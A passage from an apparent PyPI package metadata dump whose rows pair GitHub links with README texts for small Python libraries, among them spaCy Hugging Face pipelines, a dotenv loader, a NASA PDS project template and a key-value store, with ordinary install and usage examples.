# ['PRON', 'NOUN', 'AUX', 'PROPN', 'CCONJ', 'PRON', 'VERB', 'ADP', 'PROPN']
```

### Text classification

Config settings for `hf_text_pipe`:

```ini
[components.hf_text_pipe]
factory = ""hf_text_pipe""
model = ""distilbert-base-uncased-finetuned-sst-2-english""  # Model name or path
revision = ""main""                 # Model revision
kwargs = {}                       # Any additional arguments for
                                  # TextClassificationPipeline
scorer = null                     # Optional scorer
```

The input texts are truncated according to the transformers model max length.

#### `TextClassificationPipeline` settings

- `model`: The model name or path.
- `revision`: The model revision. For production use, a specific git commit is
  recommended instead of the default `main`.
- `kwargs`: Any additional arguments to
  [`TextClassificationPipeline`](https://huggingface.co/docs/transformers/main_classes/pipelines#transformers.TextClassificationPipeline).

#### Example

```python
import spacy

nlp = spacy.blank(""en"")
nlp.add_pipe(
    ""hf_text_pipe"",
    config={""model"": ""distilbert-base-uncased-finetuned-sst-2-english""},
)
doc = nlp(""This is great!"")
print(doc.cats)
# {'POSITIVE': 0.9998694658279419, 'NEGATIVE': 0.00013048505934420973}
```

### Batching and GPU

Both token and text classification support batching with `nlp.pipe`:

```python
for doc in nlp.pipe(texts, batch_size=256):
    do_something(doc)
```

If the component runs into an error processing a batch (e.g. on an empty text),
`nlp.pipe` will back off to processing each text individually. If it runs into
an error on an individual text, a warning is shown and the doc is returned
without additional annotation.

Switch to GPU:

```python
import spacy
spacy.require_gpu()

for doc in nlp.pipe(texts):
    do_something(doc)
```

## Bug reports and issues

Please report bugs in the
[spaCy issue tracker](https://github.com/explosion/spaCy/issues) or open a new
thread on the [discussion board](https://github.com/explosion/spaCy/discussions)
for other issues.
",explosion/spacy-huggingface-pipelines
geoquizzy,https://github.com/bassneel/geoquizzy,0,390,390,"# geoquizzy


[![image](https://img.shields.io/pypi/v/geoquizzy.svg)](https://pypi.python.org/pypi/geoquizzy)
[![image](https://img.shields.io/conda/vn/conda-forge/geoquizzy.svg)](https://anaconda.org/conda-forge/geoquizzy)


**a fun geography quiz game**


-   Free software: MIT license
-   Documentation: https://bassneel.github.io/geoquizzy
    

## Features

-   TODO
","# geoquizzy


[![image](https://img.shields.io/pypi/v/geoquizzy.svg)](https://pypi.python.org/pypi/geoquizzy)
[![image](https://img.shields.io/conda/vn/conda-forge/geoquizzy.svg)](https://anaconda.org/conda-forge/geoquizzy)


**a fun geography quiz game**


-   Free software: MIT license
-   Documentation: https://bassneel.github.io/geoquizzy
    

## Features

-   TODO
",bassneel/geoquizzy
goxlrutilityapi,https://github.com/timmo001/goxlr-utility-api-py,4,0,0,,,timmo001/goxlr-utility-api-py
ssenv,https://github.com/asheswook/Environment,0,1174,1174,"# Super Simple Environment

![Release](https://shields.io/github/v/release/asheswook/Environment?display_name=tag&sort=semver) ![build](https://img.shields.io/github/actions/workflow/status/asheswook/Environment/docker-workflow.yml?branch=main)

Super Duper Simple, Super Duper Easy dotenv (.env) package in Python.

## Feature

- Handle dotenv (.env)
- Import, Load, and Use it now!

## Installation

### Requirements

- Python 3.X

You can just install Environment package by using pip:

```bash
pip install ssenv
```

## Usage

**Import the package**

First, you should import the package and create an instance of Environment class.

```python
import ssenv

env = ssenv.Environment()
```

**Load the dotenv**

You can load the dotenv file by using `load_dotenv()` method. If you want to reload the dotenv file, you can just use `load_dotenv()` method again.

```python
env.load_dotenv()
```

**Use it!**

You can use the dotenv file by using `get()` method. If you want to get the value of the dotenv, you can just use `get()` method with the key of the dotenv. If the dotenv file doesn't have the key, it will return `None`.

```python
pwd = env.get('MY_PASSWORD')
```
","# Super Simple Environment

![Release](https://shields.io/github/v/release/asheswook/Environment?display_name=tag&sort=semver) ![build](https://img.shields.io/github/actions/workflow/status/asheswook/Environment/docker-workflow.yml?branch=main)

Super Duper Simple, Super Duper Easy dotenv (.env) package in Python.

## Feature

- Handle dotenv (.env)
- Import, Load, and Use it now!

## Installation

### Requirements

- Python 3.X

You can just install Environment package by using pip:

```bash
pip install ssenv
```

## Usage

**Import the package**

First, you should import the package and create an instance of Environment class.

```python
import ssenv

env = ssenv.Environment()
```

**Load the dotenv**

You can load the dotenv file by using `load_dotenv()` method. If you want to reload the dotenv file, you can just use `load_dotenv()` method again.

```python
env.load_dotenv()
```

**Use it!**

You can use the dotenv file by using `get()` method. If you want to get the value of the dotenv, you can just use `get()` method with the key of the dotenv. If the dotenv file doesn't have the key, it will return `None`.

```python
pwd = env.get('MY_PASSWORD')
```
",asheswook/environment
ovos-tts-plugin-piper,https://github.com/OpenVoiceOS/ovos-tts-plugin-piper,1,0,0,,,openvoiceos/ovos-tts-plugin-piper
pyved,https://github.com/wkta/gamedev-pyved,0,0,0,,,wkta/gamedev-pyved
dictf,https://github.com/Eric-Mendes/dictf,1,1433,1433,"# dictf
An extended Python dict implementation that supports multiple key selection with a pretty syntax.

## How to use it
First you install the package with pip
```bash
pip install dictf
```
Then you can use it like this:
```python
from dictf import dictf


example_dictf = dictf(name=""Led Zepellin"", singer=""Robert Plant"", guitarist=""Jimmy Page"")

print(example_dictf[""name""])
>>> 'Led Zepellin'

print(example_dictf[[""name""]])
>>> {'name': 'Led Zepellin'}

# The pandas inspired syntax makes it easy to understand how the lib works
print(example_dictf[[""name"", ""singer""]])
>>> {'name': 'Led Zepellin', 'singer': 'Robert Plant'}

# The return type is a dictf whenever you use a list, tuple or set as key
print(type(example_dictf[[""name"", ""singer""]]))
>>> dictf

# If one key doesn't exist, a KeyError is raised
print(example_dictf[[""name"", ""singer"", ""drummer""]])
>>> KeyError
```
Currently you can not make multiple assignments at the same time, and I'm not sure we need to add this functionality. I'm open to suggestions, though!

## Contributing
Contributions are welcome and appreciated. Make sure to read our [guide for contributing](https://github.com/Eric-Mendes/dictf/blob/main/CONTRIBUTING.md) and don't forget to check out our [code of conduct](https://github.com/Eric-Mendes/dictf/blob/main/CODE_OF_CONDUCT.md).

Also, please do check out our other libs as well such as https://github.com/Eric-Mendes/unexpected-isaves.
","# dictf
An extended Python dict implementation that supports multiple key selection with a pretty syntax.

## How to use it
First you install the package with pip
```bash
pip install dictf
```
Then you can use it like this:
```python
from dictf import dictf


example_dictf = dictf(name=""Led Zepellin"", singer=""Robert Plant"", guitarist=""Jimmy Page"")

print(example_dictf[""name""])
>>> 'Led Zepellin'

print(example_dictf[[""name""]])
>>> {'name': 'Led Zepellin'}

# The pandas inspired syntax makes it easy to understand how the lib works
print(example_dictf[[""name"", ""singer""]])
>>> {'name': 'Led Zepellin', 'singer': 'Robert Plant'}

# The return type is a dictf whenever you use a list, tuple or set as key
print(type(example_dictf[[""name"", ""singer""]]))
>>> dictf

# If one key doesn't exist, a KeyError is raised
print(example_dictf[[""name"", ""singer"", ""drummer""]])
>>> KeyError
```
Currently you can not make multiple assignments at the same time, and I'm not sure we need to add this functionality. I'm open to suggestions, though!

## Contributing
Contributions are welcome and appreciated. Make sure to read our [guide for contributing](https://github.com/Eric-Mendes/dictf/blob/main/CONTRIBUTING.md) and don't forget to check out our [code of conduct](https://github.com/Eric-Mendes/dictf/blob/main/CODE_OF_CONDUCT.md).

Also, please do check out our other libs as well such as https://github.com/Eric-Mendes/unexpected-isaves.
",eric-mendes/dictf
spectralib,https://github.com/jack-white1/spectralib,0,181,181,"A python library for creating synthetic filterbank files (pulsars, FRBs, RFI) for radio astronomy. Integrate functions in your code or use standalone to generate custom datasets.


","A python library for creating synthetic filterbank files (pulsars, FRBs, RFI) for radio astronomy. Integrate functions in your code or use standalone to generate custom datasets.


",jack-white1/spectralib
movemapp-client,https://github.com/geografia-au/movemapp_client,4,0,0,,,geografia-au/movemapp_client
test-push-swap,https://github.com/hu8813/tester_push_swap,0,0,0,,,hu8813/tester_push_swap
registry-sweepers,https://github.com/NASA-PDS/registry-sweepers,19,10426,10373,"# PDS Template Repository for Python

This is the template repository for PDS's Python projects.

This repository aims at being a base for new python repositories used in PDS. It guides developers to ease the initialization of a project and recommends preferred options to standardize developments and ease maintenance. Simply click the <kbd>Use this template</kbd> button ↑ (or use [this hyperlink](https://github.com/NASA-PDS/pds-template-repo-python/generate)).


## 🏃 Getting Started With This Template

See our wiki page for more info on setting up your new repo. You can remove this section once you have completed the necessary start-up steps.

https://github.com/NASA-PDS/nasa-pds.github.io/wiki/Git-and-Github-Guide#creating-a-new-repo

**👉 Important!** You must assign the teams as mentioned on the wiki page above! At a minimum, these are:

| Team                                | Permission |
| ----------------------------------- | ---------- |
| `@NASA-PDS/pds-software-committers` | `write`    |
| `@NASA-PDS/pds-software-pmc`        | `admin`    |
| `@NASA-PDS/pds-operations`          | `admin`    |

---

# My Project

This is the XYZ that does this, that, and the other thing for the Planetary Data System.

Please visit our website at: https://nasa-pds.github.io/pds-my-project

It has useful information for developers and end-users.

## Prerequisites

Include any system-wide requirements (`brew install`, `apt-get install`, `yum install`, …) **Python 3** should be used regardless as [Python 2 reached end-of-life on January 1st, 2020](https://pythonclock.org/).


## User Quickstart

Install with:

    pip install my_pds_module

If possible, make it so that your program works out of the box without any additional configuration—but see the [Configuration](###configuration) section for details.

To execute, run:

    (put your run commands here)


## Code of Conduct

All users and developers of the NASA-PDS software are expected to abide by our [Code of Conduct](https://github.com/NASA-PDS/.github/blob/main/CODE_OF_CONDUCT.md). Please read this to ensure you understand the expectations of our community.


## Development

To develop this project, use your favorite text editor, or an integrated development environment with Python support, such as [PyCharm](https://www.jetbrains.com/pycharm/).


### Contributing

For information on how to contribute to NASA-PDS codebases please take a look at our [Contributing guidelines](https://github.com/NASA-PDS/.github/blob/main/CONTRIBUTING.md).


### Installation

Install in editable mode and with extra developer dependencies into your virtual environment of choice:

    pip install --editable '.[dev]'

Configure the `pre-commit` hooks:

    pre-commit install
    pre-commit install -t pre-push
    pre-commit install -t prepare-commit-msg
    pre-commit install -t commit-msg

These hooks check code formatting and also aborts commits that contain secrets such as passwords or API keys. However, a one time setup is required in your global Git configuration. See [the wiki entry on Git Secrets](https://github.com/NASA-PDS/nasa-pds.github.io/wiki/Git-and-Github-Guide#git-secrets) to learn how.

### Packaging

To isolate and be able to re-produce the environment for this package, you should use a [Python Virtual Environment](https://docs.python.org/3/tutorial/venv.html). To do so, run:

    python -m venv venv

Then exclusively use `venv/bin/python`, `venv/bin/pip`, etc.

If you have `tox` installed and would like it to create your environment and install dependencies for you run:

    tox --devenv <name you'd like for env> -e dev

Dependencies for development are specified as the `dev` `extras_require` in `setup.cfg`; they are installed into the virtual environment as follows:

    pip install --editable '.[dev]'

All the source code is in a sub-directory under `src`.

You should update the `setup.cfg` file with:

- name of your module
- license, default apache, update if needed
- description
- download url, when you release your package on github add the url here
- keywords
- classifiers
- install_requires, add the dependencies of you package
- extras_require, add the development Dependencies of your package
- entry_points, when your package can be called in command line, this helps to deploy command lines entry points pointing to scripts in your package

For the packaging details, see https://packaging.python.org/tutorials/packaging-projects/ as a reference.


### Configuration

It is convenient to use ConfigParser package to manage configuration. It allows a default configuration which can be overwritten by the user in a specific file in their environment. See https://pymotw.com/2/ConfigParser/

For example:

    candidates = ['my_pds_module.ini', 'my_pds_module.ini.default']
    found = parser.read(candidates)


### Logs

You should not use `print()`vin the purpose of logging information on the execution of your code. Depending on where the code runs these information could be redirected to specific log files.

To make that work, start each Python file with:

```python
import logging

logger = logging.getLogger(__name__)
```

To log a message:

    logger.info(""my message"")

In your `main` routine, include:

    logging.basicConfig(level=logging.INFO)

to get a basic logging system configured.


### Tooling

The `dev` `extras_require` included in the template repo installs `black`, `flake8` (plus some plugins), and `mypy` along with default configuration for all of them. You can run all of these (and more!) with:

    tox -e lint


### Code Style

So that your code is readable, you should comply with the [PEP8 style guide](https://www.python.org/dev/peps/pep-0008/). Our code style is automatically enforced in via [black](https://pypi.org/project/black/) and [flake8](https://flake8.pycqa.org/en/latest/). See the [Tooling section](#-tooling) for information on invoking the linting pipeline.

❗Important note for template users❗
The included [pre-commit configuration file](.pre-commit-config.yaml) executes `flake8` (along with `mypy`) across the entire `src` folder and not only on changed files. If you're converting a pre-existing code base over to this template that may result in a lot of errors that you aren't ready to deal with.

You can instead execute `flake8` only over a diff of the current changes being made by modifying the `pre-commit` `entry` line:

    entry: git diff -u | flake8 --diff

Or you can change the `pre-commit` config so `flake8` is only called on changed files which match a certain filtering criteria:

    -   repo: local
        hooks:
        -   id: flake8
            name: flake8
            entry: flake8
            files: ^src/|tests/
            language: system


### Recommended Libraries

Python offers a large variety of libraries. In PDS scope, for the most current usage we should use:

| Library      | Usage                                           |
|--------------|------------------------------------------------ |
| configparser | manage and parse configuration files            |
| argparse     | command line argument documentation and parsing |
| requests     | interact with web APIs                          |
| lxml         | read/write XML files                            |
| json         | read/write JSON files                           |
| pyyaml       | read/write YAML files                           |
| pystache     | generate files from templates                   |

Some of these are built into Python 3; others are open source add-ons you can include in your `requirements.txt`.


### Tests

This section describes testing for your package.

A complete ""build"" including test execution, linting (`mypy`, `black`, `flake8`, etc.), and documentation build is executed via:

    tox


#### Unit tests

Your project should have built-in unit tests, functional, validation, acceptance, etc., tests.

For unit testing, check out the [unittest](https://docs.python.org/3/library/unittest.html) module, built into Python 3.

Tests objects should be in packages `test` modules or preferably in project 'tests' directory which mirrors the project package structure.

Our unit tests are launched with command:

    pytest

If you want your tests to run automatically as you make changes start up `pytest` in watch mode with:

    ptw


#### Integration/Behavioral Tests

One should use the `behave package` and push the test results to ""testrail"".

See an example in https://github.com/NASA-PDS/pds-doi-service#behavioral-testing-for-integration--testing


### Documentation

Your project should use [Sphinx](https://www.sphinx-doc.org/en/master/) to build its documentation. PDS' documentation template is already configured as part of the default build. You can build your projects docs with:

    python setup.py build_sphinx

You can access the build files in the following directory relative to the project root:

    build/sphinx/html/


## Build

    pip install wheel
    python setup.py sdist bdist_wheel


## Publication

NASA PDS packages can publish automatically using the [Roundup Action](https://github.com/NASA-PDS/roundup-action), which leverages GitHub Actions to perform automated continuous integration and continuous delivery. A default workflow that includes the Roundup is provided in the `.github/workflows/unstable-cicd.yaml` file. (Unstable here means an interim release.)


### Manual Publication

Create the package:

    python setup.py bdist_wheel

Publish it as a Github release.

Publish on PyPI (you need a PyPI account and configure `$HOME/.pypirc`):

    pip install twine
    twine upload dist/*

Or publish on the Test PyPI (you need a Test PyPI account and configure `$HOME/.pypirc`):

    pip install twine
    twine upload --repository testpypi dist/*

## CI/CD

The template repository comes with our two ""standard"" CI/CD workflows, `stable-cicd` and `unstable-cicd`. The unstable build runs on any push to `main` (± ignoring changes to specific files) and the stable build runs on push of a release branch of the form `release/<release version>`. Both of these make use of our GitHub actions build step, [Roundup](https://github.com/NASA-PDS/roundup-action). The `unstable-cicd` will generate (and constantly update) a SNAPSHOT release. If you haven't done a formal software release you will end up with a `v0.0.0-SNAPSHOT` release (see NASA-PDS/roundup-action#56 for specifics).
","# PDS Template Repository for Python

This is the template repository for PDS's Python projects.

This repository aims at being a base for new python repositories used in PDS. It guides developers to ease the initialization of a project and recommends preferred options to standardize developments and ease maintenance. Simply click the Use this template button ↑ (or use [this hyperlink](https://github.com/NASA-PDS/pds-template-repo-python/generate)).


## 🏃 Getting Started With This Template

See our wiki page for more info on setting up your new repo. You can remove this section once you have completed the necessary start-up steps.

https://github.com/NASA-PDS/nasa-pds.github.io/wiki/Git-and-Github-Guide#creating-a-new-repo

**👉 Important!** You must assign the teams as mentioned on the wiki page above! At a minimum, these are:

| Team                                | Permission |
| ----------------------------------- | ---------- |
| `@NASA-PDS/pds-software-committers` | `write`    |
| `@NASA-PDS/pds-software-pmc`        | `admin`    |
| `@NASA-PDS/pds-operations`          | `admin`    |

---

# My Project

This is the XYZ that does this, that, and the other thing for the Planetary Data System.

Please visit our website at: https://nasa-pds.github.io/pds-my-project

It has useful information for developers and end-users.

## Prerequisites

Include any system-wide requirements (`brew install`, `apt-get install`, `yum install`, …) **Python 3** should be used regardless as [Python 2 reached end-of-life on January 1st, 2020](https://pythonclock.org/).


## User Quickstart

Install with:

    pip install my_pds_module

If possible, make it so that your program works out of the box without any additional configuration—but see the [Configuration](###configuration) section for details.

To execute, run:

    (put your run commands here)


## Code of Conduct

All users and developers of the NASA-PDS software are expected to abide by our [Code of Conduct](https://github.com/NASA-PDS/.github/blob/main/CODE_OF_CONDUCT.md). Please read this to ensure you understand the expectations of our community.


## Development

To develop this project, use your favorite text editor, or an integrated development environment with Python support, such as [PyCharm](https://www.jetbrains.com/pycharm/).


### Contributing

For information on how to contribute to NASA-PDS codebases please take a look at our [Contributing guidelines](https://github.com/NASA-PDS/.github/blob/main/CONTRIBUTING.md).


### Installation

Install in editable mode and with extra developer dependencies into your virtual environment of choice:

    pip install --editable '.[dev]'

Configure the `pre-commit` hooks:

    pre-commit install
    pre-commit install -t pre-push
    pre-commit install -t prepare-commit-msg
    pre-commit install -t commit-msg

These hooks check code formatting and also aborts commits that contain secrets such as passwords or API keys. However, a one time setup is required in your global Git configuration. See [the wiki entry on Git Secrets](https://github.com/NASA-PDS/nasa-pds.github.io/wiki/Git-and-Github-Guide#git-secrets) to learn how.

### Packaging

To isolate and be able to re-produce the environment for this package, you should use a [Python Virtual Environment](https://docs.python.org/3/tutorial/venv.html). To do so, run:

    python -m venv venv

Then exclusively use `venv/bin/python`, `venv/bin/pip`, etc.

If you have `tox` installed and would like it to create your environment and install dependencies for you run:

    tox --devenv  -e dev

Dependencies for development are specified as the `dev` `extras_require` in `setup.cfg`; they are installed into the virtual environment as follows:

    pip install --editable '.[dev]'

All the source code is in a sub-directory under `src`.

You should update the `setup.cfg` file with:

- name of your module
- license, default apache, update if needed
- description
- download url, when you release your package on github add the url here
- keywords
- classifiers
- install_requires, add the dependencies of you package
- extras_require, add the development Dependencies of your package
- entry_points, when your package can be called in command line, this helps to deploy command lines entry points pointing to scripts in your package

For the packaging details, see https://packaging.python.org/tutorials/packaging-projects/ as a reference.


### Configuration

It is convenient to use ConfigParser package to manage configuration. It allows a default configuration which can be overwritten by the user in a specific file in their environment. See https://pymotw.com/2/ConfigParser/

For example:

    candidates = ['my_pds_module.ini', 'my_pds_module.ini.default']
    found = parser.read(candidates)


### Logs

You should not use `print()`vin the purpose of logging information on the execution of your code. Depending on where the code runs these information could be redirected to specific log files.

To make that work, start each Python file with:

```python
import logging

logger = logging.getLogger(__name__)
```

To log a message:

    logger.info(""my message"")

In your `main` routine, include:

    logging.basicConfig(level=logging.INFO)

to get a basic logging system configured.


### Tooling

The `dev` `extras_require` included in the template repo installs `black`, `flake8` (plus some plugins), and `mypy` along with default configuration for all of them. You can run all of these (and more!) with:

    tox -e lint


### Code Style

So that your code is readable, you should comply with the [PEP8 style guide](https://www.python.org/dev/peps/pep-0008/). Our code style is automatically enforced in via [black](https://pypi.org/project/black/) and [flake8](https://flake8.pycqa.org/en/latest/). See the [Tooling section](#-tooling) for information on invoking the linting pipeline.

❗Important note for template users❗
The included [pre-commit configuration file](.pre-commit-config.yaml) executes `flake8` (along with `mypy`) across the entire `src` folder and not only on changed files. If you're converting a pre-existing code base over to this template that may result in a lot of errors that you aren't ready to deal with.

You can instead execute `flake8` only over a diff of the current changes being made by modifying the `pre-commit` `entry` line:

    entry: git diff -u | flake8 --diff

Or you can change the `pre-commit` config so `flake8` is only called on changed files which match a certain filtering criteria:

    -   repo: local
        hooks:
        -   id: flake8
            name: flake8
            entry: flake8
            files: ^src/|tests/
            language: system


### Recommended Libraries

Python offers a large variety of libraries. In PDS scope, for the most current usage we should use:

| Library      | Usage                                           |
|--------------|------------------------------------------------ |
| configparser | manage and parse configuration files            |
| argparse     | command line argument documentation and parsing |
| requests     | interact with web APIs                          |
| lxml         | read/write XML files                            |
| json         | read/write JSON files                           |
| pyyaml       | read/write YAML files                           |
| pystache     | generate files from templates                   |

Some of these are built into Python 3; others are open source add-ons you can include in your `requirements.txt`.


### Tests

This section describes testing for your package.

A complete ""build"" including test execution, linting (`mypy`, `black`, `flake8`, etc.), and documentation build is executed via:

    tox


#### Unit tests

Your project should have built-in unit tests, functional, validation, acceptance, etc., tests.

For unit testing, check out the [unittest](https://docs.python.org/3/library/unittest.html) module, built into Python 3.

Tests objects should be in packages `test` modules or preferably in project 'tests' directory which mirrors the project package structure.

Our unit tests are launched with command:

    pytest

If you want your tests to run automatically as you make changes start up `pytest` in watch mode with:

    ptw


#### Integration/Behavioral Tests

One should use the `behave package` and push the test results to ""testrail"".

See an example in https://github.com/NASA-PDS/pds-doi-service#behavioral-testing-for-integration--testing


### Documentation

Your project should use [Sphinx](https://www.sphinx-doc.org/en/master/) to build its documentation. PDS' documentation template is already configured as part of the default build. You can build your projects docs with:

    python setup.py build_sphinx

You can access the build files in the following directory relative to the project root:

    build/sphinx/html/


## Build

    pip install wheel
    python setup.py sdist bdist_wheel


## Publication

NASA PDS packages can publish automatically using the [Roundup Action](https://github.com/NASA-PDS/roundup-action), which leverages GitHub Actions to perform automated continuous integration and continuous delivery. A default workflow that includes the Roundup is provided in the `.github/workflows/unstable-cicd.yaml` file. (Unstable here means an interim release.)


### Manual Publication

Create the package:

    python setup.py bdist_wheel

Publish it as a Github release.

Publish on PyPI (you need a PyPI account and configure `$HOME/.pypirc`):

    pip install twine
    twine upload dist/*

Or publish on the Test PyPI (you need a Test PyPI account and configure `$HOME/.pypirc`):

    pip install twine
    twine upload --repository testpypi dist/*

## CI/CD

The template repository comes with our two ""standard"" CI/CD workflows, `stable-cicd` and `unstable-cicd`. The unstable build runs on any push to `main` (± ignoring changes to specific files) and the stable build runs on push of a release branch of the form `release/`. Both of these make use of our GitHub actions build step, [Roundup](https://github.com/NASA-PDS/roundup-action). The `unstable-cicd` will generate (and constantly update) a SNAPSHOT release. If you haven't done a formal software release you will end up with a `v0.0.0-SNAPSHOT` release (see NASA-PDS/roundup-action#56 for specifics).
",nasa-pds/registry-sweepers
spdxmerge,https://github.com/philips-software/SPDXMerge,2,0,0,,,philips-software/spdxmerge
py-sls-lambda-toolkit,https://github.com/0riion/py-sls-lambda-toolkit,4,0,0,,,0riion/py-sls-lambda-toolkit
dech,https://github.com/evidlo/dech,0,966,966,"# DECH

DECH is a library for DEClaratively generating HTML pages in Python.  This may be useful for generating summary report pages containing images/tables from scientific scripts.

## Install

    pip install dech
    
## Example Usage

``` python
from dech import *
import matplotlib.pyplot as plt
import numpy as np

img1 = np.random.random((100, 100))

plt.figure('plot1')
plt.plot(np.random.random(10))
plt.figure('plot2')
plt.plot(np.random.random(10))

Page(
    [
        [
            Figure('Example 1', Img('/tmp/example.gif')),
            Figure('Example 2', Img('/tmp/example.gif')),
            Figure('Example 3', Img('/tmp/example.gif')),
        ],
        [
            Figure('Matplotlib 1', Img(plt.figure('plot1'), width=300)),
            Figure('Matplotlib 2', Img(plt.figure('plot2'), width=300)),
        ],
        [
            Figure('Numpy Array', Img(img1, width=300)),
        ],
]).save('/tmp/display.html')
```

![](example.png)

","# DECH

DECH is a library for DEClaratively generating HTML pages in Python.  This may be useful for generating summary report pages containing images/tables from scientific scripts.

## Install

    pip install dech
    
## Example Usage

``` python
from dech import *
import matplotlib.pyplot as plt
import numpy as np

img1 = np.random.random((100, 100))

plt.figure('plot1')
plt.plot(np.random.random(10))
plt.figure('plot2')
plt.plot(np.random.random(10))

Page(
    [
        [
            Figure('Example 1', Img('/tmp/example.gif')),
            Figure('Example 2', Img('/tmp/example.gif')),
            Figure('Example 3', Img('/tmp/example.gif')),
        ],
        [
            Figure('Matplotlib 1', Img(plt.figure('plot1'), width=300)),
            Figure('Matplotlib 2', Img(plt.figure('plot2'), width=300)),
        ],
        [
            Figure('Numpy Array', Img(img1, width=300)),
        ],
]).save('/tmp/display.html')
```

![](example.png)

",evidlo/dech
pacakge1,https://github.com/Shaikh-Ubaid/lpython_packages,0,0,0,,,shaikh-ubaid/lpython_packages
brandpy,https://github.com/deamonpog/BrandPy,2,471,471,"# brandpy

[![PyPI - Version](https://img.shields.io/pypi/v/brandpy.svg)](https://pypi.org/project/brandpy)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/brandpy.svg)](https://pypi.org/project/brandpy)

-----

**Table of Contents**

- [Installation](#installation)
- [License](#license)

## Installation

```console
pip install brandpy
```

## License

`brandpy` is distributed under the terms of the [MIT](https://spdx.org/licenses/MIT.html) license.
","# brandpy

[![PyPI - Version](https://img.shields.io/pypi/v/brandpy.svg)](https://pypi.org/project/brandpy)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/brandpy.svg)](https://pypi.org/project/brandpy)

-----

**Table of Contents**

- [Installation](#installation)
- [License](#license)

## Installation

```console
pip install brandpy
```

## License

`brandpy` is distributed under the terms of the [MIT](https://spdx.org/licenses/MIT.html) license.
",deamonpog/brandpy
pydroiddepot,https://github.com/thetestgame/pyDroidDepot,0,110,110,"
Module for controlling droids built and purchased at the Droid Depot in Disney's Galaxys Edge over Bleutooth
","
Module for controlling droids built and purchased at the Droid Depot in Disney's Galaxys Edge over Bleutooth
",thetestgame/pydroiddepot
huggingsimplecuellar-lib,https://github.com/pypa/sampleproject,7,2146,2146,"#HuggingSimpleCuellar_lib

Una libreria simple para usar modelos de huggingface de forma sencilla en pocas lineas de codigo
Ya sea con transformers o usando la api de request de huggingface, puedes generar imagenes de forma rapida con Stable diffusion

instalacion de la libreria:

```shell
pip3 install HuggingSimpleCuellar_lib
```

Genera Imagenes usando la api de huggingface:

```python
from HuggingSimpleCuellar_lib import generate_image

generate_image(
    model_name=""Ingresa_modelo_Stable diffusion"",
    token=""Tu_token_hugging"",
    prompt=""descripcion de la imagen"",
    title=""Titulo para guardar la Imagen""
)
```
Para generar texto usando la Api:

```python
from HuggingSimpleCuellar_lib import generate_text

generated_text = generate_text(
    model_name=""EleutherAI/gpt-neo-125m"",
    token=""Tu_Token_Huggingface"",
    prompt=""Can you please let us know more details about your"",
    max_length=50
)

print(generated_text)
```

Para generar texto usando transformers:

```python
from HuggingSimpleCuellar_lib import generate_transformers_text

generated_transformers_text = generate_transformers_text(
    model_name=""Emilianohack6950/M.A.R.I.A"",
    prompt=""Hello, how are you?"",
    max_length=50
)

print(generated_transformers_text)
```

si quieres usar un modelo de tensorflow:

```python
from HuggingSimpleCuellar_lib import generate_transformers_text

generated_transformersTF_text = generate_transformersTF_text(
    model_name=""Emilianohack6950/M.A.R.I.A"",
    prompt=""Hello, how are you?"",
    max_length=50
)

print(generated_transformers_text)
```

Para generar imagenes con Stable diffusion en caso de tener una Gpu en tu ordenador:

```python
from HuggingSimpleCuellar_lib import generate_image_diffusers

generate_image_diffusers = generate_image_diffusers(
    nombre_del_modelo=""Nombre_del_modelo_Stable_diffusion"", 
    ingresa_prompt=""Descripcion_de_la_imagen"", 
    nombre_de_la_imagen=""Nombre_a_guardar_la_imagen
)
```

Por el momento la libreria aun se encuentra en desarrollo pronto se le agregaran mas cosas como entrenamiento de modelos de lenguaje usando la api de transformers en pocas lineas de codigo","#HuggingSimpleCuellar_lib

Una libreria simple para usar modelos de huggingface de forma sencilla en pocas lineas de codigo
Ya sea con transformers o usando la api de request de huggingface, puedes generar imagenes de forma rapida con Stable diffusion

instalacion de la libreria:

```shell
pip3 install HuggingSimpleCuellar_lib
```

Genera Imagenes usando la api de huggingface:

```python
from HuggingSimpleCuellar_lib import generate_image

generate_image(
    model_name=""Ingresa_modelo_Stable diffusion"",
    token=""Tu_token_hugging"",
    prompt=""descripcion de la imagen"",
    title=""Titulo para guardar la Imagen""
)
```
Para generar texto usando la Api:

```python
from HuggingSimpleCuellar_lib import generate_text

generated_text = generate_text(
    model_name=""EleutherAI/gpt-neo-125m"",
    token=""Tu_Token_Huggingface"",
    prompt=""Can you please let us know more details about your"",
    max_length=50
)

print(generated_text)
```

Para generar texto usando transformers:

```python
from HuggingSimpleCuellar_lib import generate_transformers_text

generated_transformers_text = generate_transformers_text(
    model_name=""Emilianohack6950/M.A.R.I.A"",
    prompt=""Hello, how are you?"",
    max_length=50
)

print(generated_transformers_text)
```

si quieres usar un modelo de tensorflow:

```python
from HuggingSimpleCuellar_lib import generate_transformers_text

generated_transformersTF_text = generate_transformersTF_text(
    model_name=""Emilianohack6950/M.A.R.I.A"",
    prompt=""Hello, how are you?"",
    max_length=50
)

print(generated_transformers_text)
```

Para generar imagenes con Stable diffusion en caso de tener una Gpu en tu ordenador:

```python
from HuggingSimpleCuellar_lib import generate_image_diffusers

generate_image_diffusers = generate_image_diffusers(
    nombre_del_modelo=""Nombre_del_modelo_Stable_diffusion"", 
    ingresa_prompt=""Descripcion_de_la_imagen"", 
    nombre_de_la_imagen=""Nombre_a_guardar_la_imagen
)
```

Por el momento la libreria aun se encuentra en desarrollo pronto se le agregaran mas cosas como entrenamiento de modelos de lenguaje usando la api de transformers en pocas lineas de codigo",pypa/sampleproject
burrowkv,https://github.com/iunary/burrowkv,0,1505,1505,"# Burrowkv

Burrowkv is a simple key-value store implementation in Python. It provides basic functionality to store and retrieve key-value pairs, as well as additional features such as JSON serialization and deserialization.

## Features

- Set a value for a given key.
- Retrieve the value associated with a key.
- Delete a key-value pair.
- Check if a key exists in the store.
- Get a list of all keys.
- Get a list of all values.
- Get a list of all key-value pairs.
- Serialize the key-value store to JSON.
- Deserialize JSON into the key-value store.

## Installation

```
pip install burrowkv
```

## Usage
```
from burrowkv import burrowkv

# Create a new instance of burrowkv
store = burrowkv()

# Set a value for a key
store.set('name', 'John')

# Retrieve the value associated with a key
name = store.get('name')  # Returns 'John'

# Delete a key-value pair
store.delete('name')

# Check if a key exists
if store.contains('name'):
    print('Key exists')
else:
    print('Key does not exist')

# Get a list of all keys
keys = store.keys()  # Returns a list of keys

# Get a list of all values
values = store.values()  # Returns a list of values

# Get a list of all key-value pairs
items = store.items()  # Returns a list of (key, value) tuples

# Serialize the key-value store to JSON

json_data = store.to_json()

# Deserialize JSON into the key-value store
store.from_json(json_data)
```

## License
This project is licensed under the MIT License. See the LICENSE file for more information.

","# Burrowkv
